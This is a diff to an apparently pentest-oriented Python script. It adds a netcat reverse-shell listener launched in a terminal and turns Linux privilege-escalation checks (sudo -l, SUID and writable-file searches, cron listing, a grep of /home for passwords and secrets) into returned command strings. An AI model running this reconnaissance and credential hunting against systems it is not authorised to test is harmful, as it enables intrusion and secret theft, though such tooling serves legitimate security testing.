@@ -1,43 +1,28 @@
 import subprocess
-import platform
+
+def open_terminal_with_command(command):
+    try:
+        subprocess.call(['gnome-terminal', '--', 'bash', '-c', f'{command}; exec bash'])
+    except Exception as e:
+        print(f"Failed to open terminal: {e}")
+
+def reverse_shell_listener(port):
+    open_terminal_with_command(f"nc -lvnp {port}")
 
 def check_sudo_permissions():
-    try:
-        result = subprocess.check_output("sudo -l", shell=True, text=True)
-        return result
-    except Exception as e:
-        return f"Error checking sudo permissions: {e}"
+    return "sudo -l"
 
 def find_suid_binaries():
-    try:
-        result = subprocess.check_output("find / -perm -4000 -type f 2>/dev/null", shell=True, text=True)
-        return result
-    except Exception as e:
-        return f"Error finding SUID binaries: {e}"
+    return "find / -perm -4000 -type f 2>/dev/null"
 
 def get_kernel_version():
-    try:
-        return platform.uname().release
-    except Exception as e:
-        return f"Error getting kernel version: {e}"
+    return "uname -r"
 
 def find_writable_files():
-    try:
-        result = subprocess.check_output("find / -writable -type f 2>/dev/null", shell=True, text=True)
-        return result
-    except Exception as e:
-        return f"Error finding writable files: {e}"
+    return "find / -writable -type f 2>/dev/null"
 
 def check_cron_jobs():
-    try:
-        result = subprocess.check_output("cat /etc/crontab; ls -l /etc/cron*", shell=True, text=True)
-        return result
-    except Exception as e:
-        return f"Error checking cron jobs: {e}"
+    return "cat /etc/crontab; ls -l /etc/cron*"
 
 def search_for_credentials():
-    try:
-        result = subprocess.check_output("grep -ri 'password\\|passwd\\|secret\\|key' /home 2>/dev/null", shell=True, text=True)
-        return result
-    except Exception as e:
-        return f"Error searching for credentials: {e}"
+    return "grep -ri 'password\\|passwd\\|secret\\|key' /home 2>/dev/null"
